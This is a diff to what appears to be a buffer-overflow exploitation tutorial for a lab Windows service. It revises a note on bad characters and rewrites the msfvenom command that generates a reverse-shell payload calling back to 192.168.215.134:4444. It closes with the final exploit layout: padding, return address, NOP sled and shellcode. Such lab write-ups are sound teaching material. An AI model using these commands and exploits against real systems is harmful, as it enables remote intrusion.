@@ -155,7 +155,7 @@ after that we run the program and we click follow the dump on the esp registry
 as we can see from 01 to ff nothing is out of place
 ![image](./images/3a9413c5914195457bc9111b260b470d.png)
 
-this is an exampple containing bad characters
+This is an exampple containing bad characters (sometimes they are in couple but only one is a bad chars (example 04,05))
 
 ![image](./images/badchars.png)
 
@@ -212,7 +212,12 @@ we should see the following error message
 we can generate the shellcode using msfvenom
 ```
 //remember to remove the bad characters 
-msfvenom -p windows/shell_reverse_tcp lhost=192.168.215.134 port=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.215.134 lport=4444 -f c -a x86 -b "\x00"
+
+or 
+
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.215.134 lport=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 ```
 the final exploit is :
 **shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow**
